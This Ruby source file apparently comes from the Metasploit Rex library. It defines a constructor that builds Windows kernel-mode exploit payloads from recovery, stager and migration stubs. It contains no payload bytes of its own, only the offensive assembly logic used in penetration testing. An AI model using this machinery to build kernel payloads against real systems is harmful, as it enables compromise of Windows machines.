# -*- coding: binary -*-
module Rex
module Payloads
module Win32

require 'rex/payloads/win32/kernel/common'
require 'rex/payloads/win32/kernel/recovery'
require 'rex/payloads/win32/kernel/stager'
require 'rex/payloads/win32/kernel/migration'

module Kernel

  #
  # Constructs a kernel-mode payload using the supplied options.  The options
  # can be:
  #
  # Recovery      : The recovery method to use, such as 'spin'.
  # Stager        : The stager method to use, such as 'sud_syscall_hook'.
  # RecoveryStub  : The recovery stub that should be used, if any.
  # UserModeStub  : The user-mode payload to execute, if any.
  # KernelModeStub: The kernel-mode payload to execute, if any.
  #
  def self.construct(opts = {})
    payload = nil

    # Generate the recovery stub
    if opts['Recovery'] and Kernel::Recovery.respond_to?(opts['Recovery'])
      opts['RecoveryStub'] = Kernel::Recovery.send(opts['Recovery'], opts)
    end

    # Append supplied recovery stub information in case there is some
    # context specific recovery that must be done.
    if opts['AppendRecoveryStub']
      opts['RecoveryStub'] = (opts['RecoveryStub'] || '') + opts['AppendRecoveryStub']
    end

    # Generate the stager
    if opts['Stager'] and Kernel::Stager.respond_to?(opts['Stager'])
      payload = Kernel::Stager.send(opts['Stager'], opts)
    # Or, generate the migrator
    elsif opts['Migrator'] and Kernel::Migration.respond_to?(opts['Migrator'])
      payload = Kernel::Migration.send(opts['Migrator'], opts)
    else
      raise ArgumentError, "A stager or a migrator must be specified."
    end

    payload
  end

end

end
end
end
